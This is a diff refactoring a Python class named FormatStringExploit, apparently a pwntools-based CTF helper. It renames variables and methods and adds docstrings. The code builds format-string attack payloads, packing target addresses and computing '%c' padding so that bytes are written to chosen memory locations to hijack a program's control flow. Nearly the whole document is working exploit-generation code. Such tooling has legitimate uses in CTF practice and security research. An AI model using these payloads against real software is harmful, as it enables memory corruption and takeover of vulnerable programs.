@@ -11,32 +11,33 @@ class FormatStringExploit:
             64 : [p64, 6]
             }
 
-    def __init__(self, printed=0, hijack_target=None, hijack_address=None):
-        self.hijack_target = hijack_target
-        self.hijack_address = hijack_address
+    def __init__(self, printed=0, hij_tar=None, hij_val=None):
+        self.hijack_target = hij_tar
+        self.hijack_address = hij_val
         FormatStringExploit.printed += printed
         
-    def address_setup(self, size=4):
-        '''Arrange size of addres per byte for optimization'''
-        adr = [(self.hijack_target + i, self.hijack_address >> 8 * i) for i in xrange(size)]
-        return sorted(map(get_byte, adr), key=lambda x : (x[1] - 16) & 0xff)
+    def value_setup(self, size=4):
+        '''Arrange size of value per byte for optimization'''
+        val = [(self.hijack_target + i, self.hijack_address >> 8 * i) for i in xrange(size)]
+        return sorted(map(get_byte, val), key=lambda x : (x[1] - 16) & 0xff)
 
     @staticmethod
-    def sort_multi_address(adr):
+    def sort_multi_target(val):
         '''This is for hijack multiple target once'''
-        return sorted(adr, key=lambda x : x[1])
+        '''Sort it by the value we want to change, so that it will be more efficient'''
+        return sorted(val, key=lambda x : x[1])
         
     @classmethod
-    def generate_target(cls, adr, bits):
-        payload = ''.join(cls.table[bits][0](i[0]) for i in adr)
-        cls.printed += cls.table[bits][1] * len(adr)
+    def generate_target(cls, val, bits):
+        payload = ''.join(cls.table[bits][0](i[0]) for i in val)
+        cls.printed += cls.table[bits][1] * len(val)
         return payload
 
     @classmethod
-    def generate_fmt(cls, adr, offset):
-        adr = map(lambda x : x[1], adr)
+    def generate_fmt(cls, val, offset):
+        val = map(lambda x : x[1], val)
         payload = ''
-        for idx, byte in enumerate(adr):
+        for idx, byte in enumerate(val):
             pad = ((byte - cls.printed) % 256 + 256) % 256
             if pad > 0:
                 payload += "%{}c".format(pad)
@@ -45,9 +46,10 @@ class FormatStringExploit:
         return payload
 
     def generate32(self, off):
-        adr = self.address_setup()
-        payload = self.generate_target(adr, 32)
-        payload += self.generate_fmt(adr, off)
+        '''For simplest usage of formatstring'''
+        val = self.value_setup()
+        payload = FormatStringExploit.generate_target(val, 32)
+        payload += FormatStringExploit.generate_fmt(val, off)
         return payload
 
     @classmethod
